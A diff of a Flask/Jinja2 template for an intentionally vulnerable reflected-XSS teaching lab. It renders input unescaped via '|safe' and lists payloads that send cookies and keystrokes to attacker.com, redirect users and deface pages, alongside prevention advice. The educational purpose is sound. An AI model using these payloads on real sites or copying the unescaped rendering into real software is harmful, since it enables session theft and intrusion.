@@ -3,21 +3,550 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Reflected XSS Demo</title>
+    <title>Reflected XSS Demo - Interactive Learning</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+
+        .page-header {
+            text-align: center;
+            color: white;
+            margin-bottom: 40px;
+        }
+
+        .page-header h1 {
+            font-size: 36px;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+
+        .page-header p {
+            font-size: 16px;
+            opacity: 0.95;
+        }
+
+        .main-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .tabs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .tab-btn {
+            padding: 12px 24px;
+            background: rgba(255,255,255,0.2);
+            color: white;
+            border: 2px solid white;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .tab-btn.active {
+            background: white;
+            color: #667eea;
+        }
+
+        .tab-btn:hover {
+            background: rgba(255,255,255,0.3);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .card-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            padding: 30px;
+        }
+
+        .card h2 {
+            color: #333;
+            font-size: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .card-label {
+            display: inline-block;
+            background: #667eea;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        input[type="text"],
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: 'Courier New', monospace;
+            transition: border-color 0.3s;
+            margin-bottom: 12px;
+            resize: vertical;
+        }
+
+        textarea {
+            min-height: 120px;
+        }
+
+        input[type="text"]:focus,
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        .preview-box {
+            background: #f9f9f9;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            padding: 20px;
+            margin-top: 15px;
+            min-height: 100px;
+            color: #333;
+            word-break: break-word;
+            font-size: 14px;
+        }
+
+        .preview-box.executed {
+            background: #ffebee;
+            border-color: #ef5350;
+        }
+
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            margin: 15px 0;
+            line-height: 1.4;
+        }
+
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
+            padding: 15px;
+            border-radius: 6px;
+            font-size: 13px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .info-box {
+            background: #e3f2fd;
+            border-left: 4px solid #2196f3;
+            padding: 15px;
+            border-radius: 6px;
+            font-size: 14px;
+            line-height: 1.6;
+            margin: 15px 0;
+        }
+
+        .flow-diagram {
+            background: #f5f5f5;
+            padding: 20px;
+            border-radius: 6px;
+            margin: 20px 0;
+        }
+
+        .flow-step {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+
+        .flow-step::before {
+            content: '';
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            background: #667eea;
+            color: white;
+            border-radius: 50%;
+            margin-right: 15px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .flow-step:nth-child(1)::before { content: '1'; }
+        .flow-step:nth-child(2)::before { content: '2'; }
+        .flow-step:nth-child(3)::before { content: '3'; }
+        .flow-step:nth-child(4)::before { content: '4'; }
+
+        .examples {
+            margin: 20px 0;
+        }
+
+        .example-btn {
+            display: inline-block;
+            padding: 8px 16px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 13px;
+            margin-right: 10px;
+            margin-bottom: 10px;
+            transition: background 0.3s;
+        }
+
+        .example-btn:hover {
+            background: #764ba2;
+        }
+
+        .alert-demo {
+            background: #fff0f0;
+            border: 2px solid #ff6b6b;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+            color: #c92a2a;
+        }
+
+        @media (max-width: 1024px) {
+            .card-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 600px) {
+            .card {
+                padding: 20px;
+            }
+
+            .page-header h1 {
+                font-size: 28px;
+            }
+
+            .tabs {
+                gap: 5px;
+            }
+
+            .tab-btn {
+                padding: 10px 16px;
+                font-size: 13px;
+            }
+        }
+    </style>
 </head>
 <body>
-    <h1>Reflected XSS Demo</h1>
-    <form action="/" method="get">
-        <label for="q">Search:</label>
-        <input id="q" name="q" value="{{ q }}">
-        <button type="submit">Search</button>
-    </form>
+    <div class="main-container">
+        <div class="page-header">
+            <h1>🔓 Reflected XSS Interactive Lab</h1>
+            <p>Learn how Cross-Site Scripting attacks work - Beginner Friendly</p>
+        </div>
 
-    <section>
-        <h2>Results</h2>
-        <!-- Intentionally unsafe: using the 'safe' filter to demonstrate reflected XSS -->
-        <div>Search results for: {{ q|safe }}</div>
-        <p>This page intentionally renders unsanitized input for educational purposes only.</p>
-    </section>
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('live-demo')">🔴 Live Demo</button>
+            <button class="tab-btn" onclick="switchTab('how-it-works')">🔍 How XSS Works</button>
+            <button class="tab-btn" onclick="switchTab('attack-examples')">⚠️ Attack Examples</button>
+            <button class="tab-btn" onclick="switchTab('fix-it')">✅ Fix & Prevention</button>
+        </div>
+
+        <!-- TAB 1: LIVE DEMO -->
+        <div id="live-demo" class="tab-content active">
+            <div class="card-grid">
+                <div class="card">
+                    <h2>🎯 Attack Input <span class="card-label">ATTACKER</span></h2>
+                    <p style="color: #666; font-size: 13px; margin-bottom: 15px;">An attacker crafts malicious input with JavaScript code.</p>
+                    <form action="/" method="get" style="margin-bottom: 0;">
+                        <label for="q">Malicious Query (try examples below):</label>
+                        <input id="q" name="q" type="text" placeholder="Enter a search term..." value="{{ q }}">
+                        <button type="submit">🔍 Execute Attack</button>
+                    </form>
+                    <div class="examples">
+                        <p style="font-size: 12px; color: #666; margin-bottom: 8px;"><strong>Quick Examples:</strong></p>
+                        <button class="example-btn" type="button" onclick="setInput('Hello World')">Simple Text</button>
+                        <button class="example-btn" type="button" onclick="setInput('&lt;img src=x onerror=&quot;alert(&quot;XSS!&quot;)&quot;&gt;')">Alert Popup</button>
+                        <button class="example-btn" type="button" onclick="setInput('&lt;script&gt;alert(&quot;Hacked!&quot;)&lt;/script&gt;')">Script Tag</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h2>💥 Live Execution <span class="card-label">VICTIM</span></h2>
+                    <p style="color: #666; font-size: 13px; margin-bottom: 15px;">The victim's browser executes the injected code in real-time.</p>
+                    <label>Browser Output (What You See):</label>
+                    <div class="preview-box {% if q %}executed{% endif %}">
+                        {% if q %}
+                            <!-- Intentionally unsafe: using the 'safe' filter to demonstrate reflected XSS -->
+                            {{ q|safe }}
+                        {% else %}
+                            <span style="color: #999; font-style: italic;">Enter input above to see live execution...</span>
+                        {% endif %}
+                    </div>
+                    <div class="info-box" style="margin-top: 15px;">
+                        ℹ️ The code above is executed directly in your browser. Notice how JavaScript runs without any warnings!
+                    </div>
+                </div>
+            </div>
+
+            <div class="card">
+                <div class="warning">
+                    ⚠️ <strong>DANGEROUS:</strong> This application intentionally renders unsanitized input. Any HTML/JavaScript you enter will execute. This is for educational purposes only!
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 2: HOW IT WORKS -->
+        <div id="how-it-works" class="tab-content">
+            <div class="card">
+                <h2>🔍 How Reflected XSS Attacks Work</h2>
+                
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">Attack Flow:</h3>
+                <div class="flow-diagram">
+                    <div class="flow-step">Attacker crafts a malicious URL with JavaScript code embedded in a parameter</div>
+                    <div class="flow-step">Attacker tricks user into clicking the link (via email, chat, forum, etc.)</div>
+                    <div class="flow-step">User's browser sends the request to the vulnerable server with the malicious code</div>
+                    <div class="flow-step">Server reflects the code back in the HTML response WITHOUT sanitizing it</div>
+                    <div class="flow-step" style="margin-bottom: 0;">Browser executes the JavaScript - attacker gains access to user's data/session</div>
+                </div>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">Example URL Attack:</h3>
+                <div class="code-block">
+http://localhost:5000/?q=&lt;img src=x onerror="alert('Your data stolen!')"&gt;
+                </div>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">What Can Attackers Do?</h3>
+                <ul style="margin-left: 20px; color: #333; line-height: 2;">
+                    <li>✓ Steal session cookies and authentication tokens</li>
+                    <li>✓ Redirect users to phishing websites</li>
+                    <li>✓ Capture keystrokes and form data</li>
+                    <li>✓ Modify page content to trick users</li>
+                    <li>✓ Download malware or execute drive-by downloads</li>
+                    <li>✓ Spread worms through user accounts</li>
+                </ul>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">Key Difference: Reflected vs Stored XSS</h3>
+                <table style="width: 100%; border-collapse: collapse; margin-top: 15px;">
+                    <tr style="background: #f5f5f5;">
+                        <th style="padding: 12px; text-align: left; border: 1px solid #ddd;"><strong>Reflected XSS</strong></th>
+                        <th style="padding: 12px; text-align: left; border: 1px solid #ddd;"><strong>Stored XSS</strong></th>
+                    </tr>
+                    <tr>
+                        <td style="padding: 12px; border: 1px solid #ddd;">In URL/parameter, reflected back immediately</td>
+                        <td style="padding: 12px; border: 1px solid #ddd;">Saved in database, executed for all visitors</td>
+                    </tr>
+                    <tr style="background: #f9f9f9;">
+                        <td style="padding: 12px; border: 1px solid #ddd;">Attacker must trick user into clicking link</td>
+                        <td style="padding: 12px; border: 1px solid #ddd;">No user interaction needed - passive infection</td>
+                    </tr>
+                    <tr>
+                        <td style="padding: 12px; border: 1px solid #ddd;">Less dangerous (single user affected)</td>
+                        <td style="padding: 12px; border: 1px solid #ddd;">More dangerous (ALL users affected)</td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB 3: ATTACK EXAMPLES -->
+        <div id="attack-examples" class="tab-content">
+            <div class="card">
+                <h2>⚠️ Real-World Attack Examples</h2>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">1️⃣ Alert Box Popup (Proof of Concept)</h3>
+                <p style="color: #666; margin-bottom: 10px;">Simplest XSS - just proves code execution:</p>
+                <div class="code-block">&lt;img src=x onerror="alert('XSS Vulnerability Found!')"&gt;</div>
+                <p style="color: #666; margin-top: 10px;">💡 Click the "Alert Popup" example button above to test this!</p>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">2️⃣ Cookie Stealing (Session Hijacking)</h3>
+                <p style="color: #666; margin-bottom: 10px;">Steals user's authentication cookies:</p>
+                <div class="code-block">&lt;img src=x onerror="fetch('http://attacker.com?cookie=' + document.cookie)"&gt;</div>
+                <div class="alert-demo">
+                    🔴 DANGER: This would send your cookies to an attacker's server!
+                </div>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">3️⃣ Keylogger (Capture User Input)</h3>
+                <p style="color: #666; margin-bottom: 10px;">Records everything user types:</p>
+                <div class="code-block">&lt;script&gt;
+document.addEventListener('keypress', (e) =&gt; {
+  fetch('http://attacker.com?key=' + e.key);
+});
+&lt;/script&gt;</div>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">4️⃣ Phishing Redirect</h3>
+                <p style="color: #666; margin-bottom: 10px;">Redirects user to fake login page:</p>
+                <div class="code-block">&lt;script&gt;
+window.location = 'http://attacker.com/fake-login';
+&lt;/script&gt;</div>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">5️⃣ Page Defacement</h3>
+                <p style="color: #666; margin-bottom: 10px;">Changes the page content:</p>
+                <div class="code-block">&lt;script&gt;
+document.body.innerHTML = '&lt;h1&gt;HACKED!&lt;/h1&gt;';
+&lt;/script&gt;</div>
+
+                <div class="info-box">
+                    ℹ️ These are educational examples. Real attacks are often more sophisticated and use obfuscation to bypass security filters.
+                </div>
+            </div>
+        </div>
+
+        <!-- TAB 4: FIX IT -->
+        <div id="fix-it" class="tab-content">
+            <div class="card">
+                <h2>✅ How to Fix & Prevent XSS</h2>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">1️⃣ Output Encoding (Escaping)</h3>
+                <p style="color: #666; margin-bottom: 10px;">Convert special characters to HTML entities:</p>
+                <div style="background: #f0f0f0; padding: 15px; border-radius: 6px; margin: 10px 0;">
+                    <strong>❌ VULNERABLE:</strong>
+                    <div class="code-block" style="margin-top: 8px;">{{ q|safe }}</div>
+                </div>
+                <div style="background: #f0f0f0; padding: 15px; border-radius: 6px; margin: 10px 0;">
+                    <strong>✅ SAFE:</strong>
+                    <div class="code-block" style="margin-top: 8px;">{{ q }}</div>
+                </div>
+                <p style="color: #666; margin-top: 10px;">Simply remove the `|safe` filter and Jinja2 will auto-escape HTML.</p>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">2️⃣ Input Validation</h3>
+                <p style="color: #666; margin-bottom: 10px;">Validate what users can input:</p>
+                <div class="code-block">def add_comment(author, message):
+    # Only allow alphanumeric and spaces
+    if not re.match(r'^[a-zA-Z0-9 ]+$', author):
+        return "Invalid author name"
+    # Limit message length
+    if len(message) > 500:
+        return "Message too long"</div>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">3️⃣ Content Security Policy (CSP)</h3>
+                <p style="color: #666; margin-bottom: 10px;">Tell browser which scripts are allowed:</p>
+                <div class="code-block">@app.after_request
+def set_csp(response):
+    response.headers['Content-Security-Policy'] = \
+        "default-src 'self'; script-src 'self'"
+    return response</div>
+                <p style="color: #666; margin-top: 10px;">💡 This prevents inline scripts from executing even if they're in the HTML.</p>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">4️⃣ Use Security Libraries</h3>
+                <p style="color: #666; margin-bottom: 10px;">Use battle-tested libraries for sanitization:</p>
+                <div class="code-block">from bleach import clean
+
+safe_message = clean(user_input, 
+    tags=['b', 'i', 'u'],  # allowed tags only
+    strip=True)  # remove disallowed tags</div>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">5️⃣ HTTP Headers</h3>
+                <p style="color: #666; margin-bottom: 10px;">Use security headers:</p>
+                <div class="code-block">X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+X-XSS-Protection: 1; mode=block</div>
+
+                <h3 style="color: #667eea; margin-top: 25px; margin-bottom: 15px;">🎯 Best Practice Checklist</h3>
+                <ul style="margin-left: 20px; color: #333; line-height: 2;">
+                    <li>✅ Always escape/encode user input before outputting to HTML</li>
+                    <li>✅ Use templating engines that auto-escape (like Jinja2)</li>
+                    <li>✅ Validate input on both client and server-side</li>
+                    <li>✅ Implement Content Security Policy headers</li>
+                    <li>✅ Sanitize HTML if you must allow it (use bleach)</li>
+                    <li>✅ Keep frameworks and libraries updated</li>
+                    <li>✅ Test with OWASP ZAP and Burp Suite</li>
+                    <li>✅ Educate developers about XSS risks</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function switchTab(tabName) {
+            // Hide all tabs
+            const contents = document.querySelectorAll('.tab-content');
+            contents.forEach(tab => tab.classList.remove('active'));
+
+            // Remove active class from all buttons
+            const buttons = document.querySelectorAll('.tab-btn');
+            buttons.forEach(btn => btn.classList.remove('active'));
+
+            // Show selected tab
+            document.getElementById(tabName).classList.add('active');
+
+            // Highlight clicked button
+            event.target.classList.add('active');
+        }
+
+        function setInput(value) {
+            document.getElementById('q').value = decodeHTMLEntities(value);
+            document.querySelector('form').submit();
+        }
+
+        function decodeHTMLEntities(text) {
+            const textarea = document.createElement('textarea');
+            textarea.innerHTML = text;
+            return textarea.value;
+        }
+    </script>
 </body>
 </html>
